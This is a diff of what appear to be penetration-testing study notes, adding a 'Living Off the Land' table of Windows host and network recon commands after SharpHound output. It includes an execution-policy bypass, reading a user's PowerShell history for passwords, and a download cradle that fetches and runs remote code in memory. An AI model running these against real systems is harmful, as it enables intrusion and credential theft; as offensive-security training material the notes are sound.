@@ -1812,6 +1812,49 @@ Closing writers
 2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
 2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing
 ```
+## Living Off the Land
+##### Env Commands For Host & Network Recon
+```
+Command													Result
+hostname												Prints the PC's Name
+[System.Environment]::OSVersion.Version					Prints out the OS version and revision level
+wmic qfe get Caption,Description,HotFixID,InstalledOn	Prints the patches and hotfixes applied to the host
+ipconfig /all											Prints out network adapter state and configurations
+set														Displays a list of environment variables for the current session (ran from CMD-prompt)
+echo %USERDOMAIN%										Displays the domain name to which the host belongs (ran from CMD-prompt)
+echo %logonserver%										Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
+```
+##### Harnessing PowerShell
+```
+Cmd-Let														Description
+Get-Module													Lists available modules loaded for use.
+Get-ExecutionPolicy -List									Will print the execution policy settings for each scope on a host.
+Set-ExecutionPolicy Bypass -Scope Process					This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we
+															vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+Get-ChildItem Env: | ft Key,Value							Return environment values such as key paths, users, computer information, etc.
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	With this string, we can get the specified user's PowerShell history. This can be quite
+																							helpful as the command history may contain passwords or point us towards configuration files
+																							or scripts that contain passwords.
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	This is a quick and easy way to download a file from the web
+																															using PowerShell and call it from memory.
+
+Let's see them in action now on the MS01 host.
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
